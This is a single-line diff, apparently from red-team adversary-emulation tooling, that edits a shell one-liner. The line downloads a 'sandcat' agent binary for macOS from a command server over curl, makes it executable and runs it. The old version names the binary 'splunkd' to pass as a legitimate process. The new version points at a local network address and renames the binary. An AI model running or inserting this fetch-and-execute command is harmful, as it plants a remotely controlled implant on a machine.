@@ -1,1 +1,1 @@
-server="http://0.0.0.0:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -v
+server="http://192.168.1.68:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > remoteDarwin;chmod +x remoteDarwin;./remoteDarwin -server $server -v
